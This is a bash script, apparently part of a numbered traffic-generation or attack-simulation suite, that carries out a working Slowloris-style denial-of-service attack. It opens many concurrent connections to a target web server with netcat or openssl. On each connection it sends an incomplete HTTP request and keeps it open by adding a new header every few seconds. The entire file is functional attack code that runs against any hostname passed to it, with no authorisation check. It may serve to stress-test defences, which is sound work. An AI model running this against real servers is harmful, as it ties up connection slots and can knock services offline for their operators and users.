#!/bin/bash
# Slowloris-style slow header attack
# Tools: nc (netcat), bash
# Targets: Slow HTTP headers to keep connections open
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 02-slowloris.sh <TARGET_FQDN>}"
if [[ "${TARGET_PROTOCOL:-http}" == "https" ]]; then
  PORT=443
  USE_SSL=true
else
  PORT=80
  USE_SSL=false
fi
NUM_CONNECTIONS="${TGEN_CONCURRENCY:-20}"
HEADER_DELAY=5
MAX_DURATION="${TGEN_DURATION:-60}"

echo "[*] Slowloris-style attack against ${TARGET}:${PORT}"
echo "    Connections: ${NUM_CONNECTIONS}"
echo "    Header delay: ${HEADER_DELAY}s"
echo "    Max duration: ${MAX_DURATION}s"
echo ""

# Resolve target IP
TARGET_IP=$(dig +short "$TARGET" | head -1)
if [[ -z "$TARGET_IP" ]]; then
  echo "WARN: Could not resolve ${TARGET}, using hostname directly"
  TARGET_IP="$TARGET"
fi

PIDS=()

cleanup() {
  echo ""
  echo "[+] Cleaning up connections..."
  for pid in "${PIDS[@]}"; do
    kill "$pid" 2>/dev/null || true
  done
  wait 2>/dev/null || true
}
trap cleanup EXIT

echo "[+] Opening ${NUM_CONNECTIONS} slow connections..."

for i in $(seq 1 $NUM_CONNECTIONS); do
  (
    # Open connection and send partial headers slowly
    {
      echo "GET / HTTP/1.1"
      echo "Host: ${TARGET}"
      echo "User-Agent: Mozilla/5.0 (Slowloris)"

      # Send additional headers slowly to keep connection open
      for j in $(seq 1 $((MAX_DURATION / HEADER_DELAY))); do
        sleep "$HEADER_DELAY"
        echo "X-Slowloris-${j}: keep-alive-$(date +%s)"
      done
    } | if [[ "$USE_SSL" == "true" ]]; then
      timeout "$MAX_DURATION" openssl s_client -connect "${TARGET_IP}:${PORT}" \
        -servername "$TARGET" -quiet 2>/dev/null || true
    else
      timeout "$MAX_DURATION" nc -q 0 "${TARGET_IP}" "${PORT}" 2>/dev/null || true
    fi

    echo "    Connection ${i} closed"
  ) &
  PIDS+=($!)
  echo "    Connection ${i} opened (PID: ${PIDS[-1]})"
done

echo ""
echo "[+] All connections established, waiting up to ${MAX_DURATION}s..."

# Wait for all connections to finish or timeout
TIMER=0
while [[ $TIMER -lt $MAX_DURATION ]]; do
  ALIVE=0
  for pid in "${PIDS[@]}"; do
    kill -0 "$pid" 2>/dev/null && ALIVE=$((ALIVE + 1))
  done
  [[ $ALIVE -eq 0 ]] && break
  echo "    Active connections: ${ALIVE} (${TIMER}s elapsed)"
  sleep 10
  TIMER=$((TIMER + 10))
done

echo ""
echo "[*] Slowloris attack complete"
